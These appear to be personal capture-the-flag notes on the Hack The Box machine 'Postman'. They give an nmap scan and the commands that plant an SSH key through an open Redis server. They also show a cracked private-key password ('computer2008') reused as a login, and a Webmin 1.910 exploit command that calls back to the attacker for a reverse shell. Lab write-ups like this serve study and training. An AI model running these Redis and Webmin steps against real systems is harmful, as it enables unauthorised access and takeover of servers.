#nmap 
```Nmap scan report for 10.10.10.160
Host is up, received user-set (0.33s latency).
Scanned at 2021-08-22 22:45:34 IST for 39s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   syn-ack Redis key-value store 4.0.9
10000/tcp open  http    syn-ack MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#enumeration 
PORT 80:got some random /uploads/,/fonts,/css all were of no use
PORT 10000: had a webadmin login page tried default creds but was unsuccessful
Port 6379(Redis):read about it from hacktricks 
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
tried few things with the webadmin portal and then tried the redis port
In that what was really good and feasible(as we had permission in the current redis dir /var/lib/redis) was the ssh rce where we genrate a id-rsa and 
then upload it to get access to user redis
```
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# ssh-keygen -t rsa                                                                             143 ⨯
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /home/archi/Documents/OSCP/postman/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/archi/Documents/OSCP/postman/id_rsa
Your public key has been saved in /home/archi/Documents/OSCP/postman/id_rsa.pub
The key fingerprint is:
SHA256:QYGO8eHIkZWkbRljSEID8cqVYhoNmJ0sGkVvNDFACmg root@kali
The key's randomart image is:
+---[RSA 3072]----+
|B@O+***oo.       |
|BE+=**+=         |
|==o++O+..        |
|=oo.+.+  .       |
|o.      S        |
|                 |
|                 |
|                 |
|                 |
+----[SHA256]-----+
                                                                                                        
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# ls
id_rsa  id_rsa.pub
                                                                                                        
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# (echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > foo.txt 
                                                                                                        
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# ls
foo.txt  id_rsa  id_rsa.pub
                                                                                                        
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit    
OK
                                                                                                        
┌──(root💀kali)-[~archi/Documents/OSCP/postman]
└─# ssh -i id_rsa redis@10.10.10.160 
```
In redis port(first I created a dir with .ssh ):
```
┌──(root💀kali)-[/home/archi/Documents/OSCP/postman]
└─# redis-cli -h 10.10.10.160
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```
Now I ssh into the box
there I found a ssh encrypted key in /opt.cracking it with john I got a passoword
```computer2008```
tried to ssh to matt with the key and password didn't work then tried to su Matt and we were successful
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```
#rootescalation 
ran linpeas but got nothing except for webmin.there were no suid,no ports for port forwarding.Then, realised we had got a port as webmin.Searching google we also got exploits for that.In the README file we got the version ```Webmin Version 1.910```
Now after searching and reading htb forums I got a hint that webmin is related to user
so tried ```Matt:computer2008```
and we are in.
I found a script in github
link:https://github.com/roughiz/Webmin-1.910-Exploit-Script
ran it and got the root
```python2 exploit.py --rhost postman.htb --rport 10000 -u Matt -p computer2008 -s true --lhost 10.10.14.88 --lport 1234```
METHOD2:
